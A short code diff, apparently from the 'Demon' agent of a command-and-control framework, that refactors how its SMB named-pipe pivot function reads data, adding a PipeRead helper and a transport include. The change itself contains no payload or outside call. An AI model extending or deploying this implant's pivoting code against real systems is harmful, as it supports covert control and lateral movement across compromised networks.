@@ -1,11 +1,11 @@
 #include <Demon.h>
 
 #include <Common/Macros.h>
-
 #include <Core/Parser.h>
 #include <Core/MiniStd.h>
 #include <Core/Command.h>
 #include <Core/Package.h>
+#include <Core/TransportSmb.h>
 
 /* TODO: Change the way new pivots gets added.
  *
@@ -53,8 +53,11 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PSIZE_T BytesSize )
 
                 *Output = Instance.Win32.LocalAlloc( LPTR, *BytesSize );
                 MemSet( *Output, 0, *BytesSize );
+                BUFFER Resp = { 0 };
+                Resp.Buffer = *Output;
+                Resp.Length = *BytesSize;
 
-                if ( Instance.Win32.ReadFile( Handle, *Output, *BytesSize, BytesSize, NULL ) )
+                if (PipeRead(Handle, &Resp))
                 {
                     PRINTF( "BytesSize Read => %d\n", *BytesSize );
                     break;
